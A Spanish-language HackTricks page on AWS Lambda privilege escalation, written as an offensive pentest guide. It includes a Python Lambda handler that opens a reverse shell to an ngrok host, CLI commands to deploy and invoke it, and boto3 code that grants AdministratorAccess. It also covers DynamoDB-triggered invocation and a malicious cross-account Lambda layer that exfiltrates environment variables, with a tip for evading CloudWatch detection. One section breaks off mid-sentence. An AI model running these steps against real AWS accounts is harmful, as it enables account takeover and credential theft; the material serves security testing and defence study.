# AWS - Lambda Privesc

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## lambda

Más información sobre lambda en:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Un usuario con los permisos **`iam:PassRole`, `lambda:CreateFunction`** y **`lambda:InvokeFunction`** puede **escalar privilegios pasando un rol IAM existente a una nueva función Lambda** que incluya código para importar la biblioteca AWS relevante a su lenguaje de programación elegido, y luego usarla para realizar acciones de su elección. El código podría ejecutarse invocando la función a través de la API de AWS.

Un atacante podría abusar de esto para obtener una **shell inversa y robar el token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
   s.connect(('4.tcp.ngrok.io',14305))
   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
   p=subprocess.call(['/bin/sh','-i'])
   time.sleep(900)
   return 0
```
{% endcode %}

```bash
# Comprime la shell inversa
zip "rev.zip" "rev.py"

# Crea la función
aws lambda create-function --function-name my_function \
    --runtime python3.9 --role <arn_del_rol_de_lambda> \
    --handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoca la función
aws lambda invoke --function-name my_function output.txt
## Si tienes el permiso lambda:InvokeFunctionUrl necesitas exponer la lambda en una URL y ejecutarla a través de la URL

# Lista los roles
aws iam list-attached-user-policies --user-name <nombre_de_usuario>
```

También podrías **abusar de los permisos del rol de lambda** desde la propia función lambda.\
Si el rol de lambda tuviera suficientes permisos, podrías usarlo para otorgarte permisos de administrador:

```python
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return response
```

**Impacto potencial:** Escalada de privilegios directa al rol de servicio lambda arbitrario especificado.

{% hint style="danger" %}
Tenga en cuenta que aunque pueda parecer interesante, **`lambda:InvokeAsync`** **no permite por sí solo ejecutar `aws lambda invoke-async`**, también necesitas `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Como en el escenario anterior, puedes **otorgarte a ti mismo el permiso `lambda:InvokeFunction`** si tienes el permiso **`lambda:AddPermission`**

```bash
# Comprueba el exploit anterior y usa la siguiente línea para otorgarte los permisos de invocación
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
   --action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```

**Impacto potencial:** Escalada de privilegios directa al rol de servicio lambda arbitrario especificado.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Un usuario con los permisos **`iam:PassRole`, `lambda:CreateFunction` y `lambda:CreateEventSourceMapping`** (y posiblemente `dynamodb:PutItem` y `dynamodb:CreateTable`), pero **sin** el permiso `lambda:InvokeFunction`, puede escalar privilegios **pasando un rol IAM existente a una nueva función Lambda** que incluya código para importar la biblioteca AWS relevante a su lenguaje de programación elegido, y luego usarla para realizar acciones de su elección. Luego tendrían que **crear una tabla DynamoDB o usar una existente**, para **crear un mapeo de origen de eventos para la función Lambda que apunte a esa tabla DynamoDB**. Luego tendrían que **poner un elemento en la tabla o esperar a que otro método lo haga para que la función Lambda sea invocada**.

```bash
aws lambda create-function --function-name my_function \
    --runtime python3.8 --role <arn_del_rol_de_lambda> \
    --handler lambda_function.lambda_handler \
    --zip-file fileb://rev.zip
```

Donde el **código** en el archivo python **utilizaría el rol objetivo**. Un ejemplo sería el mismo script utilizado en los métodos anteriores.

Después de esto, el siguiente paso depende de **si se está utilizando DynamoDB** en el entorno AWS actual. **Si** se está **usando**, todo lo que se necesita hacer es **crear el mapeo de origen de eventos** para la función Lambda, pero si no, entonces el atacante necesitará **crear una tabla con transmisión habilitada** con el siguiente comando:

```bash
aws dynamodb create-table --table-name my_table \
    --attribute-definitions AttributeName=Test,AttributeType=S \
    --key-schema AttributeName=Test,KeyType=HASH \
    --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
    --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```

Después de este comando, el atacante **conectaría la función Lambda y la tabla DynamoDB** creando un mapeo de origen de eventos con el siguiente comando:

```bash
aws lambda create-event-source-mapping --function-name my_function \
    --event-source-arn <arn_de_la_transmisión_de_la_tabla_dynamodb> \
    --enabled --starting-position LATEST
```

Ahora que la función Lambda y la transmisión están conectadas, el atacante puede **invocar la función Lambda al activar la transmisión de DynamoDB**. Esto se puede hacer poniendo un elemento en la tabla DynamoDB, lo que activará la transmisión, usando el siguiente comando:

```bash
aws dynamodb put-item --table-name my_table \
    --item Test={S="Random string"}
```

En este punto, la función Lambda será invocada, y el atacante será hecho administrador de la cuenta de AWS.

**Impacto potencial:** Escalada de privilegios directa al rol de servicio lambda especificado.

### `lambda:AddPermission`

Un atacante con este permiso puede **otorgarse a sí mismo (o a
### `lambda:UpdateFunctionConfiguration`

#### Introducción

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) permite incluir **código** en su función lambda pero **almacenándolo por separado**, de modo que el código de la función puede permanecer pequeño y **varias funciones pueden compartir código**.

Dentro de lambda, puede verificar las rutas desde donde se carga el código de Python con una función como la siguiente:

```python
import json
import sys

def lambda_handler(event, context):
    print(json.dumps(sys.path, indent=2))
```

Estos son los lugares:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Por ejemplo, la biblioteca boto3 se carga desde `/var/runtime/boto3` (cuarta posición).

#### Explotación

**Adjuntar una capa a una función** solo requiere el permiso `lambda:UpdateFunctionConfiguration` y **las capas se pueden compartir entre cuentas**. También necesitaríamos saber **qué bibliotecas están usando**, para que podamos anularlas correctamente, pero en este ejemplo, simplemente **asumiremos que la función atacada está importando boto3**.

Solo para estar seguros, vamos a usar Pip para instalar la misma versión de la biblioteca boto3 desde el tiempo de ejecución de Lambda al que apuntamos (Python 3.7), solo para que no haya nada diferente que pueda causar problemas en la función objetivo. Ese tiempo de ejecución actualmente usa la versión 1.9.42 de boto3.

Con el siguiente código, instalaremos la versión 1.9.42 de boto3 y sus dependencias en una carpeta local "lambda\_layer":

```
pip3 install -t ./lambda_layer boto3==1.9.42
```

A continuación, abriremos `/lambda_layer/boto3/__init__.py` y agregaremos el código malicioso. La carga útil que agregaremos se ve así:

![](<../../../.gitbook/assets/image (26).png>)

`requests` se importa desde `botocore`. La función exfiltrará las variables de entorno, y el try-except y el tiempo de espera de 0,1 están allí para asegurarse de que este código no rompa nada.

{% hint style="info" %}
**Nota importante:** Ya no debe usar `from botocore.vendored import requests` en pruebas de penetración reales, porque se imprimirá una "DeprecationWarning" en los registros de CloudWatch de esa función, lo que probablemente lo hará atrapar por un defensor.
{% endhint %}

Ahora, empaquete ese código en un **archivo ZIP** y **cárguelo** en una **nueva capa Lambda en la cuenta ATACANTE**. Primero deberá crear una carpeta "python" y poner sus bibliotecas allí para que una vez que lo carguemos en Lambda, el código se encuentre en "/opt/python/boto3". Además, asegúrese de que la capa sea compatible con Python 3.7 y que la **capa esté en la misma región que nuestra función objetivo**. Una vez hecho esto, usaremos `lambda:AddLayerVersionPermission` para **hacer que la capa sea públicamente accesible** para que nuestra cuenta objetivo pueda usarla. Use sus credenciales personales de AWS para esta llamada a la API.

```bash
aws lambda add-layer-version-permission --layer-name boto3 \
    --version-number 1 --statement-id public \
    --action lambda:GetLayerVersion --principal *
```

Ahora, con las **credenciales comprometidas** que tenemos, ejecutaremos el siguiente comando en nuestra función Lambda objetivo "s3-getter", que **adjuntará nuestra capa Lambda entre cuentas**.

```
aws lambda update-function-configuration \
    --function-name s3-getter \
    --layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```

El siguiente paso sería **invocar la función** nosotros mismos si podemos o esperar hasta que se invoque por medios normales, que es el método más seguro.

Una **forma más sigilosa de explotar esta vulnerabilidad** se puede encontrar en:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Impacto potencial:** Escalada de privilegios directa al rol de servicio lambda utilizado.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Tal vez con esos permisos pueda crear una función y ejecutarla llamando a la URL... pero no pude encontrar una forma de probarlo, así que avíseme si lo hace.

### Lambda MitM

Algunas lambdas van a **recibir información confidencial de los usuarios en los parámetros**. Si obtiene RCE en una de ellas, puede exfiltrar la información que otros usuarios le envían, compruébelo en:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si desea ver su **empresa anunciada en HackTricks** o si desea acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtenga el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>